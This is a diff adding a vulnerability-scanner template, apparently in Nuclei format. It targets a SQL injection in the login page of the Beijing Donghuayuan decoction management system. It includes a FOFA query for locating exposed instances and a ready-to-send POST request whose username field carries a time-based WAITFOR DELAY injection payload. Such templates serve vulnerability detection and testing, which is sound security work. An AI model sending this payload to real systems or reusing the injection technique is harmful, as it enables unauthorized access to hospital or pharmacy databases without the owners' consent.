@@ -1,0 +1,32 @@
+id: poc-zua6d26ltgbc91eg
+info:
+  name: 北京东华原煎药管理系统前台login存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zua6d26ltgbc91eg'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zua6d26ltgbc91eg
+    fofa: body="北京东华原煎药管理系统"
+http:
+- raw:
+  - 'POST /login.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2742.29 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 343
+
+    Connection: close
+
+
+    __VIEWSTATE=%2FwEPDwUKLTUwOTQ0NDQ3MWRkpgdsi8t2Mpk2etkPTx4dYYLWqCgu%2FxH2%2BSt7PujLq64%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAARwJ6xNw95zeL4t2WXovB5lY3plgk0YBAefRz3MyBlTcE5Fo5u8Nmrtdka2GVrCes2inihG6d%2FXh3PZm3b5AoMQd2u8tes2WA%2BdOem8kT6x%2BfxKMf1BxSTB7qkCSortUm0%3D&txtUserName=admin%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&txtUserPwd=123&btnLogin=%E7%99%BB%E5%BD%95'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
